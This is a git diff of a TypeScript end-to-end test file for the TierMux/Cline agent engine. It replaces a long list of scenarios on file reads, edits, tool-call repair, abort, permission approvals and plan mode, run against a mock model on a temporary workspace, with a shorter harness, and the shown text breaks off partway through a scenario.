@@ -1,1423 +1,322 @@
-// v3 Foundation Gate — THE contract for the engine; every scenario must pass. 1-10 are SDK-level
-// technical cases (runAgent + a scripted LanguageModelV4 mock): tool calls, edit correctness,
-// repair paths, multi-step, cancellation, permissions. 11+ drive the REAL engine through the
-// __setClineEngineModelForTests seam: plan mode, context correctness, streaming/reasoning, session
-// persistence, todoWrite, diagnostics feedback, nudges, stream-error surfacing, failover, MCP.
-// One file on purpose. Run: npm run test:e2e:foundation
-
+// Foundation Gate — THE contract. The agent is Cline (@cline/agents loop, @cline/core tools and
+// prompt); this file locks what TierMux still owns around it, driving the REAL engine through
+// the __setClineEngineModelForTests seam with Cline's real builtin tools on a temp workspace:
+// tool results reach the model, the checkpoint baseline, approvals and their settings, plan mode
+// enforcement, the ask card, rules in the prompt, MCP tools, abort, failures and the step cap.
+// Run: npm run test:e2e:foundation
 import * as fs from 'fs';
 import * as os from 'os';
 import * as path from 'path';
-import type { ToolSet } from 'ai';
 import { createMockModel, type MockResponse } from './mockClineModel';
-import { createReadFileTool } from '../src/agent/core/tools/v3/readFile';
-import { createEditFileTool } from '../src/agent/core/tools/v3/editFile';
-import { runWithWorkspaceRoot } from '../src/agent/core/tools/workspaceRoot';
-import { runAgentStream as engineRun, runPlanStream as engineRunPlan } from '../src/agent/agent';
-import { __setClineEngineModelForTests } from '../src/agent/core/cline/clineEngine';
-import { resolvePolicy, defaultPolicy as prodDefaultPolicy, policyFromSettings, clearSessionGrants } from '../src/permissions/policy';
-import { setMcpManager } from '../src/agent/core/tools/mcp/manager';
-import { buildV3ToolSet } from '../src/agent/core/tools/v3';
-import { createStreamTextSplitter } from '../src/agent/core/routerProvider';
-import { composeSystemPrompt } from '../src/context/system';
-import { gatherPromptContext, invalidatePromptContext } from '../src/context/promptContext';
-import * as vscode from 'vscode';
-import type { AgentOpts, AgentResult } from '../src/agent/agent';
+import { runAgentStream, runPlanStream } from '../src/agent/agent';
+import { __setClineEngineModelForTests, agentToChatMessages, chatToAgentMessages } from '../src/agent/core/cline/clineEngine';
+import { clearSessionGrants } from '../src/permissions/policy';
+import { setMcpManager, type McpManager } from '../src/mcp/mcpManager';
+import { runWithWorkspaceRoot } from '../src/util/workspaceRoot';
+import type { AgentOpts, AgentResult, ToolEvent } from '../src/agent/agent';
 import type { ChatMessage } from '../src/shared/types';
 
 let failures = 0;
 const ok = (name: string, cond: boolean, detail = '') => {
-  console.log(`${cond ? 'PASS' : 'FAIL'}  ${name}${detail && !cond ? ` — ${detail}` : ''}`);
+  console.log(`${cond ? 'PASS' : 'FAIL'}  ${name}${detail ? `   (${detail})` : ''}`);
   if (!cond) failures++;
 };
-// cline-agent branch: old-engine turn machinery that Cline's runtime now owns (or that has a
-// Cline-native replacement pending) — logged as SKIP, counted as neither pass nor failure.
-const gone = (name: string, why: string) => { console.log(`SKIP  ${name}   (${why})`); };
 
-function makeWorkspace(): { root: string; read: (f: string) => string } {
-  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'tiermux-poc-'));
+function workspace(): { root: string; file: (f: string) => string; read: (f: string) => string } {
+  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'tm-foundation-'));
   fs.writeFileSync(path.join(root, 'foo.txt'), 'hello world', 'utf8');
-  fs.writeFileSync(path.join(root, 'bar.txt'), 'second file', 'utf8');
-  return { root, read: (f) => fs.readFileSync(path.join(root, f), 'utf8') };
+  return { root, file: (f) => path.join(root, f), read: (f) => fs.readFileSync(path.join(root, f), 'utf8') };
 }
 
-/** Collects events so scenarios can assert what actually happened. */
-function tracker() {
-  const toolEvents: Array<{ toolName: string; status: string; input?: unknown }> = [];
-  const chunks: string[] = [];
-  const errors: unknown[] = [];
-  const approvalRequests: Array<{ tool: string; input?: unknown }> = [];
-  return {
-    toolEvents, chunks, errors, approvalRequests,
-    wire: (t: { onChunk?: (s: string) => void; onTool?: (e: { toolName: string; status: string; input?: unknown }) => void; onError?: (e: unknown) => void }) => ({
-      onChunk: (s: string) => { chunks.push(s); t.onChunk?.(s); },
-      onTool: (e: { toolName: string; status: string; input?: unknown }) => { toolEvents.push(e); t.onTool?.(e); },
-      onError: (e: unknown) => { errors.push(e); t.onError?.(e); },
-    }),
-  };
+function settings(values: Record<string, unknown>): void {
+  (globalThis as { __tiermuxTestConfig?: Record<string, unknown> }).__tiermuxTestConfig = values;
 }
 
+interface Run {
+  result: AgentResult;
+  model: ReturnType<typeof createMockModel>;
+  tools: ToolEvent[];
+  asks: Array<{ toolName?: string; command?: string }>;
+  errors: string[];
+  reasoning: string[];
+  questions: Array<{ question: string; options?: string[] }>;
+  writes: Array<{ path: string; before: string | null }>;
+}
 
-// ── The REAL engine harness (src/agent/agent.ts → core/engine.ts), used by every scenario ──
-
-/** Minimal AgentOpts for engine turns; scenarios override what they care about. */
-function engineOpts(over: Partial<AgentOpts> & { messages: ChatMessage[]; mode: AgentOpts['mode'] }): AgentOpts {
-  return {
+let seq = 0;
+async function turn(root: string, script: MockResponse[], over: Partial<AgentOpts> & { verdict?: 'once' | 'always' | 'reject' } = {}): Promise<Run> {
+  const model = createMockModel(script, `m${++seq}`);
+  const run: Omit<Run, 'result'> = { model, tools: [], asks: [], errors: [], reasoning: [], questions: [], writes: [] };
+  const { verdict = 'once', ...rest } = over;
+  const opts: AgentOpts = {
+    messages: [{ role: 'user', content: 'do the task' }],
+    mode: 'agent',
     effort: 'medium',
+    sessionId: `s${seq}`,
     onChunk: () => {},
-    onTool: () => {},
-    onReasoning: () => {},
+    onTool: (e) => { run.tools.push(e); },
+    onReasoning: (t) => { run.reasoning.push(t); },
     onModel: () => {},
     onFailover: () => {},
     onStep: () => {},
-    onTodos: () => {},
-    onAskUser: async () => ({ status: 'answered' as const, answers: ['yes'] }),
-    onError: () => {},
-    ...over,
+    onError: (m) => { run.errors.push(m); },
+    onAskUser: async (qs) => {
+      run.questions.push(...qs.map((q) => ({ question: q.question, options: q.options })));
+      return { status: 'answered', answers: ['Use TypeScript'] };
+    },
+    onPermissionAsk: async (info) => { run.asks.push(info); return verdict; },
+    onBeforeWrite: (uri, before) => { run.writes.push({ path: uri.fsPath, before }); },
+    ...rest,
   };
-}
-
-async function engineTurn(model: ReturnType<typeof createMockModel>, opts: AgentOpts): Promise<AgentResult> {
   __setClineEngineModelForTests(model);
-  // The public entries force their mode (same as production callers) — pick by requested mode.
-  const entry = opts.mode === 'plan' ? engineRunPlan : engineRun;
   try {
-    return await entry(opts);
+    const result = await runWithWorkspaceRoot(root, () => (opts.mode === 'plan' ? runPlanStream(opts) : runAgentStream(opts)));
+    return { ...run, result };
   } finally {
     __setClineEngineModelForTests(undefined);
   }
 }
 
-/** Engine tool events are `{name, state}` (ToolEvent), not the POC's `{toolName, status}`. */
-function engineTracker() {
-  const tools: Array<{ name: string; state: string; args?: unknown }> = [];
-  const chunks: string[] = [];
-  const asks: Array<{ toolName?: string; pattern?: string | string[]; command?: string }> = [];
-  return {
-    tools, chunks, asks,
-    ran: (name: string) => tools.some((e) => e.name === name && e.state === 'done'),
-    wire: (verdict: 'once' | 'always' | 'reject' = 'once') => ({
-      onTool: (e: unknown) => { tools.push(e as { name: string; state: string; args?: unknown }); },
-      onChunk: (t: string) => { chunks.push(t); },
-      onPermissionAsk: async (info: { toolName?: string; pattern?: string | string[]; command?: string }) => {
-        asks.push(info);
-        return verdict;
-      },
-    }),
-  };
-}
-
-/** Drives the engine's permission mode, which comes from settings (policyFromSettings), not
- *  from a policy object a caller can hand in — production has no such seam and neither should
- *  the gate. 'always' → ask, 'allowlist' → auto.
- *
- *  'never' is NOT full-auto. It means "disable terminal command execution entirely" — its own
- *  enumDescription — and scenario 29 pins that. For don't-ask runs use `autoApprove: true`. */
-function withCommandApproval<T>(value: 'always' | 'allowlist' | 'never', fn: () => Promise<T>): Promise<T> {
-  const g = globalThis as { __tiermuxTestConfig?: Record<string, unknown> };
-  const prev = g.__tiermuxTestConfig;
-  g.__tiermuxTestConfig = { ...(prev ?? {}), commandApproval: value };
-  return fn().finally(() => { g.__tiermuxTestConfig = prev; });
-}
+const requestText = (m: ReturnType<typeof createMockModel>, i: number): string => JSON.stringify(m.calls[i]?.messages ?? []);
+const offered = (m: ReturnType<typeof createMockModel>): string[] => (m.calls[0]?.tools ?? []).map((t) => t.name);
+const done = (r: Run, name: string) => r.tools.some((e) => e.name === name && e.state === 'done');
 
 async function main() {
-  // ── Scenario 1: read ─────────────────────────────────────────────────────────
+  settings({});
+
+  console.log('— 1. a Cline tool result reaches the model and the transcript —');
   {
-    const ws = makeWorkspace();
-    const model = createMockModel([
-      { toolCalls: [{ toolName: 'readFile', input: { path: 'foo.txt' } }] },
-      { text: 'The file says: hello world' },
-    ], 's1');
-    const tr = engineTracker();
-    const out = await runWithWorkspaceRoot(ws.root, () => engineTurn(model, engineOpts({
-      messages: [{ role: 'user', content: 'read foo.txt' }],
-      mode: 'agent',
-      ...tr.wire(),
-    })));
-    ok('1. tool executed and succeeded', tr.ran('readFile'), JSON.stringify(tr.tools));
-    ok('1. model saw the file content in step 2',
-      model.calls.length === 2 && JSON.stringify(model.calls[1].messages).includes('hello world'),
-      `call2=${JSON.stringify(model.calls[1]?.messages).slice(0, 200)}`);
-    ok('1. read output is line-numbered file format',
-      JSON.stringify(model.calls[1].messages).includes('<file path='),
-      'real tool contract: cat -n style <file> wrapper');
-    ok('1. streamed text arrived', tr.chunks.join('').includes('hello world') || out.text.includes('hello world'),
-      `chunks=${JSON.stringify(tr.chunks)} text=${out.text}`);
-    ok('1. natural finish', out.finishReason === 'stop', `finishReason=${out.finishReason}`);
-    ok('1. two model calls (tool step + synthesis)', model.calls.length === 2, `calls=${model.calls.length}`);
-  }
-
-  // ── Scenario 2: edit ─────────────────────────────────────────────────────────
-  {
-    const ws = makeWorkspace();
-    const model = createMockModel([
-      { toolCalls: [{ toolName: 'editFile', input: { path: 'foo.txt', search: 'hello', replace: 'goodbye' } }] },
-      { text: 'edited' },
-    ], 's2');
-    await withCommandApproval('never', () => runWithWorkspaceRoot(ws.root, () => engineTurn(model, engineOpts({
-      messages: [{ role: 'user', content: 'change hello to goodbye in foo.txt' }],
-      mode: 'agent',
-    }))));
-    ok('2. edit applied on disk', ws.read('foo.txt') === 'goodbye world', `content=${ws.read('foo.txt')}`);
-    ok('2. no repair round was needed', model.calls.length === 2, `calls=${model.calls.length}`);
-  }
-
-  // ── Scenario 2b: whitespace-tolerant match + re-indent ───────────────────────
-  {
-    const ws = makeWorkspace();
-    fs.writeFileSync(path.join(ws.root, 'indented.ts'), 'function f() {\n  return 1;\n}\n', 'utf8');
-    const model = createMockModel([
-      { toolCalls: [{ toolName: 'editFile', input: { path: 'indented.ts', search: 'return 1;', replace: 'return 2;' } }] },
-      { text: 'done' },
-    ], 's2b');
-    await withCommandApproval('never', () => runWithWorkspaceRoot(ws.root, () => engineTurn(model, engineOpts({
-      messages: [{ role: 'user', content: 'return 2 instead' }],
-      mode: 'agent',
-    }))));
-    ok('2b. flexible match + reindent', ws.read('indented.ts') === 'function f() {\n  return 2;\n}\n',
-      `content=${JSON.stringify(ws.read('indented.ts'))}`);
-  }
-
-  // ── Scenario 3: malformed args → self-correct (repairToolCall) ───────────────
-  {
-    const ws = makeWorkspace();
-    // Call 1 (outer): bad input — path is a number; the real zod union(string, array) rejects it.
-    // Call 2 (repair-inner): corrected call. Call 3 (outer step 2): final answer.
-    const model = createMockModel([
-      { toolCalls: [{ toolName: 'readFile', input: '{"path": 42}' }] },
-      { toolCalls: [{ toolName: 'readFile', input: { path: 'foo.txt' } }] },
-      { text: 'recovered: the file says hello world' },
-    ], 's3');
-    const tr = engineTracker();
-    const out = await runWithWorkspaceRoot(ws.root, () => engineTurn(model, engineOpts({
-      messages: [{ role: 'user', content: 'read foo.txt' }],
-      mode: 'agent',
-      ...tr.wire(),
-    })));
-    ok('3. repair consumed exactly one extra model call', model.calls.length === 3, `calls=${model.calls.length}`);
-    ok('3. corrected call executed with valid input',
-      tr.tools.some((e) => e.name === 'readFile' && e.state === 'done' && (e.args as { path?: string })?.path === 'foo.txt'),
-      JSON.stringify(tr.tools));
-    ok('3. turn still completed', out.finishReason === 'stop', `finish=${out.finishReason}`);
-  }
-
-  // ── Scenario 4: nonexistent tool → self-correct ──────────────────────────────
-  {
-    const ws = makeWorkspace();
-    const model = createMockModel([
-      { toolCalls: [{ toolName: 'readTheFile', input: { path: 'foo.txt' } }] },
-      { toolCalls: [{ toolName: 'readFile', input: { path: 'foo.txt' } }] },
-      { text: 'recovered after name fix' },
-    ], 's4');
-    const tr = engineTracker();
-    const out = await runWithWorkspaceRoot(ws.root, () => engineTurn(model, engineOpts({
-      messages: [{ role: 'user', content: 'read foo.txt' }],
-      mode: 'agent',
-      ...tr.wire(),
-    })));
-    ok('4. unknown tool repaired to a real one', tr.ran('readFile'), JSON.stringify(tr.tools));
-    ok('4. turn completed', out.finishReason === 'stop', `finish=${out.finishReason}`);
-  }
-
-  // ── Scenario 5: a tool FAILURE keeps the loop alive and reaches the model ─────
-  // Replaces the old "execute() throws → SDK Path B" case, which needed a synthetic throwing
-  // stub that exists nowhere in production: every v3 tool catches and returns `{ error }`
-  // (readFile.ts's contract note). What production actually depends on is the CONTRACT above
-  // that — a failed tool must not end the turn, and its reason must reach the model so the
-  // next step can self-correct. That is what is asserted here, on the real toolset.
-  {
-    const ws = makeWorkspace();
-    const model = createMockModel([
-      { toolCalls: [{ toolName: 'editFile', input: { path: 'foo.txt', search: 'this text is not in the file', replace: 'x' } }] },
-      { toolCalls: [{ toolName: 'editFile', input: { path: 'foo.txt', search: 'hello', replace: 'recovered' } }] },
-      { text: 'first attempt failed, second worked' },
-    ], 's5');
-    const tr = engineTracker();
-    let crashed = false;
-    let out: AgentResult | undefined;
-    try {
-      out = await withCommandApproval('never', () => runWithWorkspaceRoot(ws.root, () => engineTurn(model, engineOpts({
-        messages: [{ role: 'user', content: 'edit foo.txt' }],
-        mode: 'agent',
-        ...tr.wire(),
-      }))));
-    } catch (e) {
-      crashed = true;
-      console.log('      unexpected throw:', e);
-    }
-    ok('5. a failing tool did NOT crash the turn', !crashed);
-    ok('5. the loop continued to a second attempt', model.calls.length === 3, `calls=${model.calls.length}`);
-    ok('5. the failure reason reached the model verbatim',
-      JSON.stringify(model.calls[1]?.messages ?? '').includes('Search text not found'),
-      `call2=${JSON.stringify(model.calls[1]?.messages).slice(0, 300)}`);
-    ok('5. the diagnostic is actionable, not a bare "not found"',
-      /no line of it appears|diverges|consecutive block/.test(JSON.stringify(model.calls[1]?.messages ?? '')),
-      'editMatch.ts failure diagnostics — see editMatch.e2e.ts');
-    ok('5. the recovery edit applied', ws.read('foo.txt') === 'recovered world', `content=${ws.read('foo.txt')}`);
-    ok('5. turn completed normally', out?.finishReason === 'stop', `finish=${out?.finishReason}`);
-  }
-
-  // ── Scenario 6: 3-5 consecutive tool calls, natural finish ────────────────────
-  {
-    const ws = makeWorkspace();
-    const model = createMockModel([
-      { toolCalls: [{ toolName: 'readFile', input: { path: 'foo.txt' } }] },
-      { toolCalls: [{ toolName: 'readFile', input: { path: 'bar.txt' } }] },
-      { toolCalls: [{ toolName: 'readFile', input: { path: 'foo.txt' } }] },
-      { text: 'read all three' },
-    ], 's6');
-    const tr = engineTracker();
-    const out = await runWithWorkspaceRoot(ws.root, () => engineTurn(model, engineOpts({
-      messages: [{ role: 'user', content: 'read foo, bar, foo' }],
-      mode: 'agent',
-      ...tr.wire(),
-    })));
-    ok('6. four steps ran naturally', model.calls.length === 4, `calls=${model.calls.length}`);
-    ok('6. every read executed', tr.tools.filter((e) => e.name === 'readFile' && e.state === 'done').length === 3,
-      JSON.stringify(tr.tools));
-    ok('6. step cap not hit', out.finishReason === 'stop', `finish=${out.finishReason}`);
-  }
-
-  // ── Scenario 7: abort mid-stream ─────────────────────────────────────────────
-  {
-    const ws = makeWorkspace();
-    const model = createMockModel([{ hang: true }], 's7');
-    const tr = engineTracker();
-    const controller = new AbortController();
-    setTimeout(() => controller.abort(), 150);
-    let settled = false;
-    let rejectReason: unknown = undefined;
-    let out: AgentResult | undefined;
-    try {
-      out = await runWithWorkspaceRoot(ws.root, () => engineTurn(model, engineOpts({
-        messages: [{ role: 'user', content: 'stall forever' }],
-        mode: 'agent',
-        abortSignal: controller.signal,
-        ...tr.wire(),
-      })));
-      settled = true;
-    } catch (e) {
-      rejectReason = e;
-      settled = true; // rejection with AbortError is an acceptable settle
-    }
-    const isAbort = rejectReason === undefined || (rejectReason as Error)?.name === 'AbortError';
-    ok('7. abort settles the turn', settled && isAbort,
-      `reason=${rejectReason ? String((rejectReason as Error).message) : 'resolved'}`);
-    ok('7. no tool ran after abort', !tr.tools.some((e) => e.state === 'done'), JSON.stringify(tr.tools));
-    ok('7. an abort with nothing streamed stays RESUMABLE (paused, not a blank success)',
-      rejectReason !== undefined || out?.paused === true, `paused=${out?.paused} text=${JSON.stringify(out?.text)}`);
-  }
-
-  // ── Scenario 8: ask mode → mutating tool prompts ─────────────────────────────
-  {
-    const ws = makeWorkspace();
-    const model = createMockModel([
-      { toolCalls: [{ toolName: 'editFile', input: { path: 'foo.txt', search: 'hello', replace: 'asked' } }] },
-      { text: 'done after approval' },
-    ], 's8');
-    const tr = engineTracker();
-    const out = await withCommandApproval('always', () => runWithWorkspaceRoot(ws.root, () => engineTurn(model, engineOpts({
-      messages: [{ role: 'user', content: 'edit foo.txt' }],
-      mode: 'agent',
-      sessionId: 's8',
-      ...tr.wire('once'),
-    }))));
-    ok('8. user was asked once', tr.asks.length === 1 && tr.asks[0].toolName === 'editFile',
-      JSON.stringify(tr.asks));
-    ok('8. the ask carried the real path, not a bare tool name', tr.asks[0]?.pattern === 'foo.txt', JSON.stringify(tr.asks));
-    ok('8. approved edit applied', ws.read('foo.txt') === 'asked world', `content=${ws.read('foo.txt')}`);
-    ok('8. turn completed', out.finishReason === 'stop', `finish=${out.finishReason}`);
-  }
-
-  // ── Scenario 8b: a REJECTED approval blocks the write and the turn survives ──
-  {
-    const ws = makeWorkspace();
-    const model = createMockModel([
-      { toolCalls: [{ toolName: 'editFile', input: { path: 'foo.txt', search: 'hello', replace: 'nope' } }] },
-      { text: 'the user declined' },
-    ], 's8b');
-    const tr = engineTracker();
-    const out = await withCommandApproval('always', () => runWithWorkspaceRoot(ws.root, () => engineTurn(model, engineOpts({
-      messages: [{ role: 'user', content: 'edit foo.txt' }],
-      mode: 'agent',
-      sessionId: 's8b',
-      ...tr.wire('reject'),
-    }))));
-    ok('8b. rejection leaves the file untouched', ws.read('foo.txt') === 'hello world', `content=${ws.read('foo.txt')}`);
-    ok('8b. the turn still completed instead of erroring out', out.finishReason === 'stop', `finish=${out.finishReason}`);
-  }
-
-  // ── Scenario 9: auto mode → read auto, mutating prompts ───────────────────────
-  {
-    const ws = makeWorkspace();
-    const model = createMockModel([
-      { toolCalls: [{ toolName: 'readFile', input: { path: 'foo.txt' } }] },
-      { toolCalls: [{ toolName: 'editFile', input: { path: 'foo.txt', search: 'hello', replace: 'auto' } }] },
-      { text: 'done' },
-    ], 's9');
-    const tr = engineTracker();
-    await withCommandApproval('allowlist', () => runWithWorkspaceRoot(ws.root, () => engineTurn(model, engineOpts({
-      messages: [{ role: 'user', content: 'read then edit' }],
-      mode: 'agent',
-      sessionId: 's9',
-      ...tr.wire('once'),
-    }))));
-    ok('9. read-only ran without asking', tr.asks.length === 1 && tr.asks[0].toolName === 'editFile',
-      JSON.stringify(tr.asks));
-    ok('9. mutating edit applied after ask', ws.read('foo.txt') === 'auto world', `content=${ws.read('foo.txt')}`);
-  }
-
-  // ── Scenario 10: full-auto, alwaysDeny wins ──────────────────────────────────
-  {
-    const ws = makeWorkspace();
-    clearSessionGrants('s10');
-    // A session deny grant, set the way production sets one: policyFromSettings hands back the
-    // STORED set reference, so adding here is what a "deny always" click does.
-    policyFromSettings(false, 'agent', 's10').alwaysDeny.add('editFile');
-    const model = createMockModel([
-      { toolCalls: [{ toolName: 'editFile', input: { path: 'foo.txt', search: 'hello', replace: 'DENIED' } }] },
-      { toolCalls: [{ toolName: 'writeFile', input: { path: 'new.txt', content: 'written in full-auto' } }] },
-      { text: 'done' },
-    ], 's10');
-    const tr = engineTracker();
-    const out = await withCommandApproval('never', () => runWithWorkspaceRoot(ws.root, () => engineTurn(model, engineOpts({
-      messages: [{ role: 'user', content: 'edit then write' }],
-      mode: 'agent',
-      sessionId: 's10',
-      ...tr.wire('once'),
-    }))));
-    ok('10. alwaysDeny blocked the edit', ws.read('foo.txt') === 'hello world', `content=${ws.read('foo.txt')}`);
-    ok('10. no approval asked in full-auto', tr.asks.length === 0, JSON.stringify(tr.asks));
-    ok('10. non-denied tool auto-ran', ws.read('new.txt') === 'written in full-auto');
-    ok('10. turn completed', out.finishReason === 'stop', `finish=${out.finishReason}`);
-    clearSessionGrants('s10');
-  }
-
-  // ── Scenarios 11-14: the REAL engine, same helpers as 1-10 (hoisted to module scope) ──
-
-  // ── Scenario 11: Plan mode flow (§12) ────────────────────────────────────────
-  {
-    const ws = makeWorkspace();
-    const planModel = createMockModel([
-      { toolCalls: [{ toolName: 'readFile', input: { path: 'foo.txt' } }] },
-      // The plan arrives as an exitPlanMode TOOL CALL, not markdown the host has to recognize
-      // (2026-08-31 redesign — see scripts/exitPlanMode.e2e.ts for the boundary's own suite).
-      { toolCalls: [{ toolName: 'exitPlanMode', input: {
-        outcome: 'plan',
-        title: 'Rename greeting',
-        interpretation: 'the greeting text in foo.txt should read "goodbye" instead of "hello"',
-        steps: [{ what: 'Replace "hello" with "goodbye"', files: ['foo.txt'], evidence: 'foo.txt:1 still reads "hello"', verify: 'read foo.txt again' }],
-      } }] },
-    ], 's11-plan');
-
-    const planTr = tracker();
-    const planResult = await runWithWorkspaceRoot(ws.root, () => engineTurn(planModel, engineOpts({
-      messages: [{ role: 'user', content: 'plan renaming hello to goodbye in foo.txt' }],
-      mode: 'plan',
-      ...planTr.wire({}),
-    })));
-
-    ok('11. plan toolset offers read+shell+exitPlanMode, NOT editors',
-      [planModel.calls[0].tools].flat().map((t) => (t as { name?: string }).name ?? '').join(' ').trim() &&
-      ['runCommand','readFile','exitPlanMode'].every((n) => planModel.calls[0].tools.map((t) => (t as { name?: string }).name).includes(n))
-      && !planModel.calls[0].tools.map((t) => (t as { name?: string }).name).includes('editFile'),
-      `tools=${JSON.stringify(planModel.calls[0].tools)}`);
-    ok('11. read executed during planning', planTr.toolEvents.some((e: { name?: string; state?: string }) => e.name === 'readFile' && e.state === 'done'));
-    ok('11. the plan reaches the host as validated structure, not prose to classify',
-      planResult.plan?.title === 'Rename greeting' && planResult.plan?.steps[0]?.files?.[0] === 'foo.txt',
-      `plan=${JSON.stringify(planResult.plan)}`);
-    ok('11. exitPlanMode ends the planning turn', planModel.calls.length === 2, `calls=${planModel.calls.length}`);
-
-    // §12 policy profile, asserted directly: read free, shell ASKS, edit hard-denied even
-    // with alwaysAllow set (approve ≠ blanket approval).
-    const planPolicy = { ...prodDefaultPolicy, sessionMode: 'plan' as const, alwaysAllow: new Set(['editFile']) };
-    const readVerdict = await resolvePolicy({ toolName: 'readFile' }, planPolicy);
-    const shellVerdict = await resolvePolicy({ toolName: 'runCommand' }, planPolicy, async () => { throw new Error('must ask'); }).catch(() => 'ASKED');
-    const editVerdict = await resolvePolicy({ toolName: 'editFile' }, planPolicy);
-    ok('11. policy: read auto-approved in plan mode', readVerdict === 'approved' || (readVerdict as { type: string }).type === 'approved');
-    ok('11. policy: shell ASKS in plan mode', shellVerdict === 'ASKED', String(shellVerdict));
-    ok('11. policy: edit hard-denied even with alwaysAllow', (editVerdict as { type: string }).type === 'denied');
-
-    // Approve flow: setMode('agent') + history kept → every tool re-gated (no blanket).
-    const agentTr = tracker();
-    const approvals: string[] = [];
-    const agentModel = createMockModel([
-      { toolCalls: [{ toolName: 'editFile', input: { path: 'foo.txt', search: 'hello', replace: 'goodbye' } }] },
-      { text: 'executed the plan' },
-    ], 's11-agent');
-    await runWithWorkspaceRoot(ws.root, () => engineTurn(agentModel, engineOpts({
-      messages: [...(planResult.workMessages ?? []), { role: 'user', content: 'Approved. Execute the plan.' }],
-      mode: 'agent',
-      ...agentTr.wire({}),
-      onPermissionAsk: async () => { approvals.push('editFile'); return 'once'; },
-    })));
-    ok('11. approve → agent mode, edit re-gated through ask', approvals.length === 1 && approvals[0] === 'editFile',
-      `approvals=${JSON.stringify(approvals)}`);
-    ok('11. approved edit applied', ws.read('foo.txt') === 'goodbye world', `content=${ws.read('foo.txt')}`);
-  }
-
-  // ── Scenario 12: Context correctness (engine-owned slice) ───────────────────
-  {
-    const ws = makeWorkspace();
-    const m1 = createMockModel([
-      { toolCalls: [{ toolName: 'readFile', input: { path: 'foo.txt' } }] },
-      { text: 'it says hello world' },
-    ], 's12a');
-    const r1 = await runWithWorkspaceRoot(ws.root, () => engineTurn(m1, engineOpts({
-      messages: [{ role: 'user', content: 'read foo.txt and remember it' }],
-      mode: 'agent',
-    })));
-
-    const m2 = createMockModel([{ text: 'hello world, as I read earlier' }], 's12b');
-    await runWithWorkspaceRoot(ws.root, () => engineTurn(m2, engineOpts({
-      messages: [...(r1.workMessages ?? []), { role: 'user', content: 'what did foo.txt say? quote it exactly' }],
-      mode: 'agent',
-    })));
-
-    const prompt2 = JSON.stringify(m2.calls[0].messages);
-    ok('12. prior tool result reaches the next turn verbatim', prompt2.includes('hello world'));
-    ok('12. user text reaches the model verbatim', prompt2.includes('quote it exactly'));
-    ok('12. nothing fabricated — unmentioned file absent from context', !prompt2.includes('bar.txt'), 'bar.txt was never referenced');
-  }
-
-  // ── Scenario 13: Streaming + reasoning + think-tag ───────────────────────────
-  {
-    const ws = makeWorkspace();
-    const events: string[] = [];
-    const chunks: string[] = [];
-    const m = createMockModel([
-      { reasoning: 'locating the file first', toolCalls: [{ toolName: 'readFile', input: { path: 'foo.txt' } }] },
-      { reasoning: 'now answering', text: 'The file says hello world' },
-    ], 's13');
-    const r = await runWithWorkspaceRoot(ws.root, () => engineTurn(m, engineOpts({
-      messages: [{ role: 'user', content: 'read foo.txt' }],
-      mode: 'agent',
-      onChunk: (t) => { chunks.push(t); events.push(`text:${t}`); },
-      onReasoning: (t) => { events.push(`reasoning:${t}`); },
-      onTool: (e) => { events.push(`tool:${(e as { name: string }).name}:${(e as { state: string }).state}`); },
-    })));
-    ok('13. reasoning reached the reasoning channel', (r.reasoning ?? '').includes('locating the file first') && (r.reasoning ?? '').includes('now answering'),
-      `reasoning=${JSON.stringify(r.reasoning)}`);
-    ok('13. reasoning never leaked into chat text', !r.text.includes('locating the file first') && !chunks.join('').includes('locating'),
-      `text=${r.text} chunks=${JSON.stringify(chunks)}`);
-    ok('13. reasoning precedes text within a step', events.indexOf('reasoning:now answering') < events.findIndex((e) => e.startsWith('text:')),
-      `events=${JSON.stringify(events)}`);
-    ok('13. tool events fired', events.some((e) => e.startsWith('tool:readFile:')));
-
-    // Think-tag no-leak through the STREAMING path's own splitter (full matrix in
-    // thinkSplit.e2e.ts — this is the in-gate spot check, incl. the R1 regression shape).
-    const splitter = createStreamTextSplitter();
-    let leaked = '';
-    let reasoning = '';
-    for (const chunk of ['<thi', 'nk>secret reasoning</th', 'ink>visible answer']) {
-      const out = splitter.feed(chunk, '');
-      leaked += out.text;
-      reasoning += out.reasoning;
-    }
-    const f = splitter.flush();
-    leaked += f.text; reasoning += f.reasoning;
-    ok('13. split <think> tags: zero leak, reasoning captured',
-      leaked === 'visible answer' && reasoning === 'secret reasoning',
-      `text=${JSON.stringify(leaked)} reasoning=${JSON.stringify(reasoning)}`);
-    const dup = createStreamTextSplitter();
-    const d1 = dup.feed('<think>same words</think>', 'same words');
-    ok('13. duplicate reasoning suppressed (first channel wins)', d1.reasoning === 'same words', `reasoning=${JSON.stringify(d1.reasoning)}`);
-  }
-
-  // ── Scenario 14: Session persistence (transcript round-trip) ─────────────────
-  {
-    const ws = makeWorkspace();
-    const m1 = createMockModel([
-      { toolCalls: [{ toolName: 'readFile', input: { path: 'foo.txt' } }] },
-      { text: 'read it, the greeting is hello world' },
-    ], 's14a');
-    const r1 = await runWithWorkspaceRoot(ws.root, () => engineTurn(m1, engineOpts({
-      messages: [{ role: 'user', content: 'read foo.txt' }],
-      mode: 'agent',
-    })));
-
-    // Simulated close/reopen: a FRESH engine turn seeded with the persisted transcript.
-    // The model must already SEE foo.txt's content — no re-read, no re-plan.
-    const tr2 = tracker();
-    const m2 = createMockModel([
-      { toolCalls: [{ toolName: 'editFile', input: { path: 'foo.txt', search: 'hello', replace: 'goodbye' } }] },
-      { text: 'edited as planned' },
-    ], 's14b');
-    await runWithWorkspaceRoot(ws.root, () => engineTurn(m2, engineOpts({
-      messages: [...(r1.workMessages ?? []), { role: 'user', content: 'now change hello to goodbye in foo.txt' }],
-      mode: 'agent',
-      ...tr2.wire({}),
-      onPermissionAsk: async () => 'once',
-    })));
-
-    const prompt2 = JSON.stringify(m2.calls[0].messages);
-    ok('14. reopened turn sees prior tool results', prompt2.includes('hello world'));
-    ok('14. no re-read — readFile NOT called in turn 2', !tr2.toolEvents.some((e: { name?: string }) => e.name === 'readFile'),
-      `events=${JSON.stringify(tr2.toolEvents.map((e: { name?: string }) => e.name))}`);
-    ok('14. agent-mode toolset recovered (editFile offered)', (m2.calls[0].tools ?? []).map((t) => (t as { name?: string }).name ?? '').includes('editFile'));
-    ok('14. edit applied from recovered context', ws.read('foo.txt') === 'goodbye world', `content=${ws.read('foo.txt')}`);
-  }
-
-  // ── Scenario 15: todoWrite tool end-to-end ──────────────────────────────────
-  {
-    const ws = makeWorkspace();
-    const seenTodos: Array<Array<{ content: string; status: string }>> = [];
-    const m = createMockModel([
